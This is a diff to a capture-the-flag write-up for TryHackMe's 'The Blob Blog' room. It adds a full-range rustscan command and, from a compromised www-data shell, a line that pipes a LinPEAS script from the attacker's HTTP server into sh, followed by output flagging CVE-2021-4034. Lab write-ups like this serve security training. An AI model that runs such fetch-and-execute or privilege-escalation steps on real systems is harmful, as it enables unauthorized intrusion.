@@ -132,6 +132,9 @@ So it's clear that it's referring the "port knocking".
 
 **Then use `rustscan` again to discover new ports:**
 ```
+┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
+└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan1.txt
+[...]
 PORT     STATE SERVICE REASON         VERSION
 21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.2
 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
@@ -582,6 +585,14 @@ The `/usr/bin/blogFeedback` looks sussy.
 
 **LinPEAS:**
 ```
+┌──(root🌸siunam)-[/usr/share/peass/linpeas]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+```
+www-data@bobloblaw-VirtualBox:~/html2$ curl -s http://10.9.0.253/linpeas.sh | sh
+[...]
 ╔══════════╣ CVEs Check
 Vulnerable to CVE-2021-4034
 
